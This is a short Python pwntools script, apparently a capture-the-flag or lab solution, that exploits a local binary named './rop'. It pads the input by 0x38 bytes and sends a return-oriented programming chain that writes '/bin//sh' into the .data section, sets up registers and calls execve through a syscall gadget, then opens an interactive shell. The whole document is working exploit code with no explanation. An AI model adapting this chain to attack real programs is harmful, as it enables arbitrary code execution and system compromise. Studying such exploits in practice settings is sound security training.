#!/usr/bin/env python3
from pwn import *
from struct import pack

p = b''
p += pack('<Q', 0x00000000004100f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000415714) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047f4f1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004100f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c70) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f4f1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004100f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000449935) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000415714) # pop rax ; ret
p += p64(59) # execve
p += pack('<Q', 0x000000000040125c) # syscall

r = process("./rop")
payload = flat(b"\x00"*(0x38),
               p)
r.sendline(payload)

r.interactive()
r.close()
